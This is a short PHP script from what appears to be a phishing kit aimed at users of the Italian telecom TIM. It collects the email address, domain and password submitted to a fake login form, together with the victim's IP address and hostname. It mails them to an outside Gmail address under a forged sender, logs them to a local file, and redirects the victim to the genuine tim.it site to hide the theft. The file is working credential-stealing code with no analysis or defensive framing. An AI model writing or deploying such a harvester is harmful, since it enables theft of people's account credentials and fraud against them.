<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ TIM DOT IT Credentials ]+==================\n";
$message .= "Email Address : ".$_POST['username']."\n";
$message .= "Domain : ".$_POST['dominio']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Domain : ".$_POST['domain']."\n";

$message .= "=============+ [ TIM DOT IT Credentials ] +=============\n";

$send= "peacesuperior437@gmail.com";

$subject = "TIM DOT IT Credentials | $ip";
$headers = "From:  TIM DOT IT <progress@baggysnowtundelizzy.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
file_put_contents("./http",$message,FILE_APPEND);

header("Location: https://www.tim.it/");
?>